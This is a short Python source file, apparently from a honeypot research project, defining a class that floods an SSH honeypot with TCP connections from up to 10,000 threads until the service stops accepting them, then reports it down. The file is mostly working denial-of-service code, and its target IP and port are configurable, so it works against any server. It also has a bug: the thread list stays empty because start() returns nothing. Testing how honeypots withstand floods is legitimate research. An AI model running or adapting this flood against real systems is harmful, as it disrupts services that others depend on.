import socket
import threading
import time
from honeypots.ssh_honeypot import SSHHoneypot

class DoS(SSHHoneypot):
    def __init__(self, server_ip, port, username, password, accepting_connections):
        super().__init__(server_ip, port, username, password)
        self.accepting_connections = True

    def send_data(self): #need to implement threading so sockets are sent all at once

        count_number_sockets_sent = 0
        #send continuous connections 
        while self.accepting_connections:
            #print("still accepting connections")
            count_number_sockets_sent = count_number_sockets_sent + 1
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.server_ip, int(self.port)))
                s.send("X".encode())
                #print("Socket sent = ", count_number_sockets_sent)
                

            except Exception as e:
                print("DoS ERRRRRRRRRRRRRRRRRRRRRRRRRRRROR = ", e)
                self.accepting_connections = False

    def run_dos_attack(self):
        cnt = 0
      
        threads = []
        while self.accepting_connections and cnt < 10000:
            t = threading.Thread(target=self.send_data).start()
            if t != None:
                threads.append(t)
            cnt = cnt + 1
        

        print("JOIN THREADS")
        time.sleep(1)
        for thread in threads:
            thread.join()


        print(f"Honeypot is down")

